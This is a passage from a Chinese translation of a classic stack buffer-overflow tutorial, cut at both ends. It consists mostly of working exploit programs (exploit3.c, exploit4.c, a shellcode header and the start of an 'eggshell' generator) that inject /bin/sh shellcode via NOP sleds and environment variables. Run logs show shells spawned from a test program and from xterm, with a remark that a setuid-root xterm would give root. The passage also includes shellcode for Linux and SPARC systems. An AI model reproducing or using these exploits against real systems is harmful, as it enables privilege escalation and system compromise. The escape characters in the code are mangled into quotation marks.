堆栈顶端&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 堆栈底部

&nbsp; &nbsp; 新的破解程序如下:

&nbsp; &nbsp; 

exploit3.c

------------------------------------------------------------------------------

#include &lt;stdlib.h&gt;

#define DEFAULT_OFFSET&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;0

#define DEFAULT_BUFFER_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 512

#define NOP&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 0x90

char shellcode[] =

&nbsp;&nbsp;""xeb"x1f"x5e"x89"x76"x08"x31"xc0"x88"x46"x07"x89"x46"x0c"xb0"x0b"

&nbsp;&nbsp;""x89"xf3"x8d"x4e"x08"x8d"x56"x0c"xcd"x80"x31"xdb"x89"xd8"x40"xcd"

&nbsp;&nbsp;""x80"xe8"xdc"xff"xff"xff/bin/sh";

unsigned long get_sp(void) {

&nbsp; &nbsp;__asm__("movl %esp,%eax");

}

void main(int argc, char *argv[]) {

&nbsp;&nbsp;char *buff, *ptr;

&nbsp;&nbsp;long *addr_ptr, addr;

&nbsp;&nbsp;int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;

&nbsp;&nbsp;int i;

&nbsp;&nbsp;if (argc &gt; 1) bsize&nbsp;&nbsp;= atoi(argv[1]);

&nbsp;&nbsp;if (argc &gt; 2) offset = atoi(argv[2]);

&nbsp;&nbsp;if (!(buff = malloc(bsize))) {

&nbsp; &nbsp; printf("Can't allocate memory."n");

&nbsp; &nbsp; exit(0);

&nbsp;&nbsp;}

&nbsp;&nbsp;addr = get_sp() - offset;

&nbsp;&nbsp;printf("Using address: 0x%x"n", addr);

&nbsp;&nbsp;ptr = buff;

&nbsp;&nbsp;addr_ptr = (long *) ptr;

&nbsp;&nbsp;for (i = 0; i &lt; bsize; i+=4)

&nbsp; &nbsp; *(addr_ptr++) = addr;

&nbsp;&nbsp;for (i = 0; i &lt; bsize/2; i++)

&nbsp; &nbsp; buff[i] = NOP;

&nbsp;&nbsp;ptr = buff + ((bsize/2) - (strlen(shellcode)/2));

&nbsp;&nbsp;for (i = 0; i &lt; strlen(shellcode); i++)

&nbsp; &nbsp; *(ptr++) = shellcode[i];

&nbsp;&nbsp;buff[bsize - 1] = '"0';

&nbsp;&nbsp;memcpy(buff,"EGG=",4);

&nbsp;&nbsp;putenv(buff);

&nbsp;&nbsp;system("/bin/bash");

}

------------------------------------------------------------------------------

&nbsp; &nbsp; 我们所使用的缓冲区大小最好比要使其溢出的缓冲区大100字节左右. 我们在要使其

溢出的缓冲区尾部放置shellcode, 为NOP指令留下足够的空间, 仍然使用我们推测的地址

来覆盖返回地址. 这里我们要使其溢出的缓冲区大小是512字节, 所以我们使用612字节.

现在使用新的破解程序来使我们的测试程序溢出:

------------------------------------------------------------------------------
  
[aleph1]$ ./exploit3 612

Using address: 0xbffffdb4
  
[aleph1]$ ./vulnerable $EGG

$

------------------------------------------------------------------------------

&nbsp; &nbsp; 哇!一击中的!这个改进成千倍地提高了我们的命中率. 下面在真实的环境中尝试一

下缓冲区溢出. 在Xt库上运用我们所讲述的方法. 在例子中, 我们使用xterm(实际上所有

连接Xt库的程序都有漏洞). 计算机上要运行X Server并且允许本地的连接. 还要相应设

置DISPLAY变量.

------------------------------------------------------------------------------
  
[aleph1]$ export DISPLAY=:0.0
  
[aleph1]$ ./exploit3 1124

Using address: 0xbffffdb4
  
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG

Warning: Color name "隵1F

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#176;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 骎

?へ@よ?in/shいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい

いいいいいいいいいいいいいいいいいいいいいいいいい&#164;

(此处截短多行输出)

いいいいいいいいいいい?いいいい

^C
  
[aleph1]$ exit
  
[aleph1]$ ./exploit3 2148 100

Using address: 0xbffffd48
  
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG

Warning: Color name "隵1F

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#176;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 骎

?へ@よ?in/sh

&#164;

(此处截短多行输出)

縃arning: some arguments in previous message were lost

Illegal instruction
  
[aleph1]$ exit

.

.

.
  
[aleph1]$ ./exploit4 2148 600

Using address: 0xbffffb54
  
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG

Warning: Color name "隵1F

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#176;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 骎

?へ@よ?in/sh鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗

鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗?

(此处截短多行输出)

縏鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸚arning: some arguments in previous message were lost

bash$

------------------------------------------------------------------------------

&nbsp; &nbsp;尤里卡! 仅仅几次尝试我们就成功了!如果xterm是带suid root安装的, 我们就已经

得到了一个root shell了. 

&nbsp; &nbsp;小缓冲区的溢出

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ~~~~~~~~~~~~~~~~

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;

&nbsp; &nbsp; 有时候想使其溢出的缓冲区太小了, 以至于shellcode都放不进去, 这样返回地址就

会被指令所覆盖, 而不是我们所推测的地址, 或者shellcode是放进去了, 但是没法填充

足够多的NOP指令, 这样推测地址的成功率就很低了. 要从这样的程序(小缓冲区)里得到

一个shell, 我们必须得想其他办法. 下面介绍的这种方法只在能够访问程序的环境变量

时有效.

&nbsp; &nbsp; 我们所做的就是把shellcode放到环境变量中去, 然后用这个变量在内存中的地址来

使缓冲区溢出. 这种方法同时也提高了破解工作的成功率, 因为保存shellcode的环境变

量想要多大就有多大.

&nbsp; &nbsp; 当程序开始时, 环境变量存储在堆栈的顶部, 任何使用setenv()的修改动作会在其他

地方重新分配空间. 开始时的堆栈如下所示:

&nbsp; &nbsp;&nbsp; &nbsp;&lt;strings&gt;&lt;argv pointers&gt;NULL&lt;envp pointers&gt;NULL&lt;argc&gt;&lt;argv&gt;&lt;envp&gt;

&nbsp; &nbsp; 我们新的程序会使用一个额外的变量, 变量的大小能够容纳shellcode和NOP指令,

新的破解程序如下所示:

exploit4.c

------------------------------------------------------------------------------

#include &lt;stdlib.h&gt;

#define DEFAULT_OFFSET&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;0

#define DEFAULT_BUFFER_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 512

#define DEFAULT_EGG_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;2048

#define NOP&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 0x90

char shellcode[] =

&nbsp;&nbsp;""xeb"x1f"x5e"x89"x76"x08"x31"xc0"x88"x46"x07"x89"x46"x0c"xb0"x0b"

&nbsp;&nbsp;""x89"xf3"x8d"x4e"x08"x8d"x56"x0c"xcd"x80"x31"xdb"x89"xd8"x40"xcd"

&nbsp;&nbsp;""x80"xe8"xdc"xff"xff"xff/bin/sh";

unsigned long get_esp(void) {

&nbsp; &nbsp;__asm__("movl %esp,%eax");

}

void main(int argc, char *argv[]) {

&nbsp;&nbsp;char *buff, *ptr, *egg;

&nbsp;&nbsp;long *addr_ptr, addr;

&nbsp;&nbsp;int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;

&nbsp;&nbsp;int i, eggsize=DEFAULT_EGG_SIZE;

&nbsp;&nbsp;if (argc &gt; 1) bsize&nbsp; &nbsp;= atoi(argv[1]);

&nbsp;&nbsp;if (argc &gt; 2) offset&nbsp;&nbsp;= atoi(argv[2]);

&nbsp;&nbsp;if (argc &gt; 3) eggsize = atoi(argv[3]);

&nbsp;&nbsp;if (!(buff = malloc(bsize))) {

&nbsp; &nbsp; printf("Can't allocate memory."n");

&nbsp; &nbsp; exit(0);

&nbsp;&nbsp;}

&nbsp;&nbsp;if (!(egg = malloc(eggsize))) {

&nbsp; &nbsp; printf("Can't allocate memory."n");

&nbsp; &nbsp; exit(0);

&nbsp;&nbsp;}

&nbsp;&nbsp;addr = get_esp() - offset;

&nbsp;&nbsp;printf("Using address: 0x%x"n", addr);

&nbsp;&nbsp;ptr = buff;

&nbsp;&nbsp;addr_ptr = (long *) ptr;

&nbsp;&nbsp;for (i = 0; i &lt; bsize; i+=4)

&nbsp; &nbsp; *(addr_ptr++) = addr;

&nbsp;&nbsp;ptr = egg;

&nbsp;&nbsp;for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)

&nbsp; &nbsp; *(ptr++) = NOP;

&nbsp;&nbsp;for (i = 0; i &lt; strlen(shellcode); i++)

&nbsp; &nbsp; *(ptr++) = shellcode[i];

&nbsp;&nbsp;buff[bsize - 1] = '"0';

&nbsp;&nbsp;egg[eggsize - 1] = '"0';

&nbsp;&nbsp;memcpy(egg,"EGG=",4);

&nbsp;&nbsp;putenv(egg);

&nbsp;&nbsp;memcpy(buff,"RET=",4);

&nbsp;&nbsp;putenv(buff);

&nbsp;&nbsp;system("/bin/bash");

}

------------------------------------------------------------------------------

&nbsp; &nbsp; 用这个新的破解程序来试试我们的漏洞测试程序:

&nbsp; &nbsp; 

------------------------------------------------------------------------------
  
[aleph1]$ ./exploit4 768

Using address: 0xbffffdb0
  
[aleph1]$ ./vulnerable $RET

$

------------------------------------------------------------------------------

&nbsp; &nbsp; 成功了, 再试试xterm:

&nbsp; &nbsp; 

------------------------------------------------------------------------------
  
[aleph1]$ export DISPLAY=:0.0
  
[aleph1]$ ./exploit4 2148

Using address: 0xbffffdb0
  
[aleph1]$ /usr/X11R6/bin/xterm -fg $RET

Warning: Color name

"挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨

挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨

(此处截短多行输出)

挨挨挨

Warning: some arguments in previous message were lost

$

------------------------------------------------------------------------------

&nbsp; &nbsp; 一次成功! 它显著提高了我们的成功率. 依赖于破解程序和被破解程序比较环境数据

的多少, 我们推测的地址可能高也可能低于真值. 正和负的偏移量都可以试一试.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 寻找缓冲区溢出漏洞

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;~~~~~~~~~~~~~~~~~~~~~

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;

&nbsp; &nbsp; 如前所述, 缓冲区溢出是向一个缓冲区填充超过其处理能力的信息造成的结果. 由于C

语言没有任何内置的边界检查, 写入一个字符数组时, 如果超越了数组的结尾就会造成溢

出. 标准C语言库提供了一些没有边界检查的字符串复制或添加函数. 包括strcat(), 

strcpy(), sprintf(), and vsprintf(). 这些函数对一个null结尾的字符串进行操作, 并

不检查溢出情况. gets()函数从标准输入中读取一行到缓冲区中, 直到换行或EOF. 它也不

检查缓冲区溢出. scanf()函数族在匹配一系列非空格字符(%s), 或从指定集合(%[])中匹

配非空系列字符时, 使用字符指针指向数组, 并且没有定义最大字段宽度这个可选项, 就

可能出现问题. 如果这些函数的目标地址是一个固定大小的缓冲区, 函数的另外参数是由

用户以某种形式输入, 则很有可能利用缓冲区溢出来破解它.

&nbsp; &nbsp; 另一种常见的编程结构是使用while循环从标准输入或某个文件中一次读入一个字符到

缓冲区中, 直到行尾或文件结尾, 或者碰到别的什么终止符. 这种结构通常使用getc(), 

fgetc(), 或getchar()函数中的某一个. 如果在while循环中没有明确的溢出检查, 这种程

序就很容易被破解.

&nbsp; &nbsp; 由此可见, grep(1)是一个很好的工具命令(帮助你找到程序中可能有的漏洞). 自由操

作系统及其工具的源码是可读的. 当你意识到其实很多商业操作系统工具都和自由软件有

着相同的源码时, 剩下的事情就简单了!&nbsp;&nbsp;:-)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;附录 A - 不同操作系统/体系结构的shellcode&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

i386/Linux

------------------------------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;jmp&nbsp; &nbsp; 0x1f

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%esi

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,0x8(%esi)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xorl&nbsp; &nbsp;%eax,%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;%eax,0x7(%esi)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%eax,0xc(%esi)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0xb,%al

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,%ebx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0x8(%esi),%ecx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0xc(%esi),%edx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xorl&nbsp; &nbsp;%ebx,%ebx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%ebx,%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;inc&nbsp; &nbsp; %eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;call&nbsp; &nbsp;-0x24

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;.string ""/bin/sh""

------------------------------------------------------------------------------

SPARC/Solaris

------------------------------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;sethi&nbsp; &nbsp;0xbd89a, %l6

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;or&nbsp; &nbsp;&nbsp; &nbsp;%l6, 0x16e, %l6

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;sethi&nbsp; &nbsp;0xbdcda, %l7

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;and&nbsp; &nbsp;&nbsp;&nbsp;%sp, %sp, %o0

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;add&nbsp; &nbsp;&nbsp;&nbsp;%sp, 8, %o1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xor&nbsp; &nbsp;&nbsp;&nbsp;%o2, %o2, %o2

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;add&nbsp; &nbsp;&nbsp;&nbsp;%sp, 16, %sp

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;std&nbsp; &nbsp;&nbsp;&nbsp;%l6, [%sp - 16]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;st&nbsp; &nbsp;&nbsp; &nbsp;%sp, [%sp - 8]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;st&nbsp; &nbsp;&nbsp; &nbsp;%g0, [%sp - 4]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;mov&nbsp; &nbsp;&nbsp;&nbsp;0x3b, %g1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ta&nbsp; &nbsp;&nbsp; &nbsp;8

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xor&nbsp; &nbsp;&nbsp;&nbsp;%o7, %o7, %o0

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;mov&nbsp; &nbsp;&nbsp;&nbsp;1, %g1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ta&nbsp; &nbsp;&nbsp; &nbsp;8

------------------------------------------------------------------------------

SPARC/SunOS

------------------------------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;sethi&nbsp; &nbsp;0xbd89a, %l6

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;or&nbsp; &nbsp;&nbsp; &nbsp;%l6, 0x16e, %l6

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;sethi&nbsp; &nbsp;0xbdcda, %l7

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;and&nbsp; &nbsp;&nbsp;&nbsp;%sp, %sp, %o0

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;add&nbsp; &nbsp;&nbsp;&nbsp;%sp, 8, %o1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xor&nbsp; &nbsp;&nbsp;&nbsp;%o2, %o2, %o2

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;add&nbsp; &nbsp;&nbsp;&nbsp;%sp, 16, %sp

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;std&nbsp; &nbsp;&nbsp;&nbsp;%l6, [%sp - 16]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;st&nbsp; &nbsp;&nbsp; &nbsp;%sp, [%sp - 8]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;st&nbsp; &nbsp;&nbsp; &nbsp;%g0, [%sp - 4]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;mov&nbsp; &nbsp;&nbsp;&nbsp;0x3b, %g1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;mov&nbsp; &nbsp;&nbsp;&nbsp;-0x1, %l5

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ta&nbsp; &nbsp;&nbsp; &nbsp;%l5 + 1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xor&nbsp; &nbsp;&nbsp;&nbsp;%o7, %o7, %o0

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;mov&nbsp; &nbsp;&nbsp;&nbsp;1, %g1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ta&nbsp; &nbsp;&nbsp; &nbsp;%l5 + 1

------------------------------------------------------------------------------

&nbsp; &nbsp;

&nbsp; &nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 附录 B - 通用缓冲区溢出程序&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;

shellcode.h

------------------------------------------------------------------------------

#if defined(__i386__) &amp;&amp; defined(__linux__)

#define NOP_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;1

char nop[] = ""x90";

char shellcode[] =

&nbsp;&nbsp;""xeb"x1f"x5e"x89"x76"x08"x31"xc0"x88"x46"x07"x89"x46"x0c"xb0"x0b"

&nbsp;&nbsp;""x89"xf3"x8d"x4e"x08"x8d"x56"x0c"xcd"x80"x31"xdb"x89"xd8"x40"xcd"

&nbsp;&nbsp;""x80"xe8"xdc"xff"xff"xff/bin/sh";

unsigned long get_sp(void) {

&nbsp; &nbsp;__asm__("movl %esp,%eax");

}

#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)

#define NOP_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;4

char nop[]=""xac"x15"xa1"x6e";

char shellcode[] =

&nbsp;&nbsp;""x2d"x0b"xd8"x9a"xac"x15"xa1"x6e"x2f"x0b"xdc"xda"x90"x0b"x80"x0e"

&nbsp;&nbsp;""x92"x03"xa0"x08"x94"x1a"x80"x0a"x9c"x03"xa0"x10"xec"x3b"xbf"xf0"

&nbsp;&nbsp;""xdc"x23"xbf"xf8"xc0"x23"xbf"xfc"x82"x10"x20"x3b"x91"xd0"x20"x08"

&nbsp;&nbsp;""x90"x1b"xc0"x0f"x82"x10"x20"x01"x91"xd0"x20"x08";

unsigned long get_sp(void) {

&nbsp;&nbsp;__asm__("or %sp, %sp, %i0");

}

#elif defined(__sparc__) &amp;&amp; defined(__sun__)

#define NOP_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;4

char nop[]=""xac"x15"xa1"x6e";

char shellcode[] =

&nbsp;&nbsp;""x2d"x0b"xd8"x9a"xac"x15"xa1"x6e"x2f"x0b"xdc"xda"x90"x0b"x80"x0e"

&nbsp;&nbsp;""x92"x03"xa0"x08"x94"x1a"x80"x0a"x9c"x03"xa0"x10"xec"x3b"xbf"xf0"

&nbsp;&nbsp;""xdc"x23"xbf"xf8"xc0"x23"xbf"xfc"x82"x10"x20"x3b"xaa"x10"x3f"xff"

&nbsp;&nbsp;""x91"xd5"x60"x01"x90"x1b"xc0"x0f"x82"x10"x20"x01"x91"xd5"x60"x01";

unsigned long get_sp(void) {

&nbsp;&nbsp;__asm__("or %sp, %sp, %i0");

}

#endif

------------------------------------------------------------------------------

eggshell.c

------------------------------------------------------------------------------

/*

* eggshell v1.0

*

* Aleph One / [email]aleph1@underground.org[/email]

*/

#include &lt;stdlib.h&gt;

#include &lt;stdio.h&gt;

#include "shellcode.h"

#define DEFAULT_OFFSET&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;0

#define DEFAULT_BUFFER_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 512

#define DEFAULT_EGG_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;2048

void usage(void);

void main(int argc, char *argv[]) {

&nbsp;&nbsp;char *ptr, *bof, *egg;

&nbsp;&nbsp;long *addr_ptr, addr;

&nbsp;&nbsp;int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;

&nbsp;&nbsp;int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;

&nbsp;&nbsp;while ((c = getopt(argc, argv, "a:b:e:")) != EOF)

&nbsp; &nbsp; switch (c) {

&nbsp; &nbsp;&nbsp; &nbsp;case 'a':

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;align = atoi(optarg);

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;

&nbsp; &nbsp;&nbsp; &nbsp;case 'b':

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;bsize = atoi(optarg);

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;

&nbsp; &nbsp;&nbsp; &nbsp;case 'e':

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;eggsize = atoi(optarg);

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;

&nbsp; &nbsp;&nbsp; &nbsp;case 'o':

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;offset = atoi(optarg);

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;

&nbsp; &nbsp;&nbsp; &nbsp;case '?':

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;usage();

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit(0);

&nbsp; &nbsp; }

&nbsp;&nbsp;if (strlen(shellcode) &gt; eggsize) {

&nbsp; &nbsp; printf("Shellcode is larger the the egg."n");

&nbsp; &nbsp; exit(0);

&nbsp;&nbsp;}

&nbsp;&nbsp;if (!(bof = malloc(bsize))) {

&nbsp; &nbsp; printf("Can't allocate memory."n");

&nbsp; &nbsp; exit(0);

&nbsp;&nbsp;}

&nbsp;&nbsp;if (!(egg = malloc(eggsize))) {

&nbsp; &nbsp; printf("Can't allocate memory."n");

&nbsp; &nbsp; exit(0);

&nbsp;&nbsp;}

&nbsp;&nbsp;addr = get_sp() - offset;

&nbsp;&nbsp;printf("[ Buffer size:"t%d"t"tEgg size:"t%d"tAligment:"t%d"t]"n",

&nbsp; &nbsp; bsize, eggsize, align);

&nbsp;&nbsp;printf("[ Address:"t0x%x"tOffset:"t"t%d"t"t"t"t]"n", addr, offset);

&nbsp;&nbsp;addr_ptr = (long *) bof;

&nbsp;&nbsp;for (i = 0; i &lt; bsize; i+=4)

&nbsp; &nbsp; *(addr_ptr++) = addr;

&nbsp;&nbsp;ptr = egg;

&nbsp;&nbsp;for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)

&nbsp; &nbsp; for (n = 0; n &lt; NOP_SIZE; n++) {

&nbsp; &nbsp;&nbsp; &nbsp;m = (n + align) % NOP_SIZE;

&nbsp; &nbsp;&nbsp; &nbsp;*(ptr++) = nop[m];

&nbsp; &nbsp; }

&nbsp;&nbsp;for (i = 0; i &lt; strlen(shellcode); i++)

&nbsp; &nbsp; *(ptr++) = shellcode[i];

&nbsp;&nbsp;bof[bsize - 1] = '"0';

&nbsp;&nbsp;egg[eggsize - 1] = '"0';

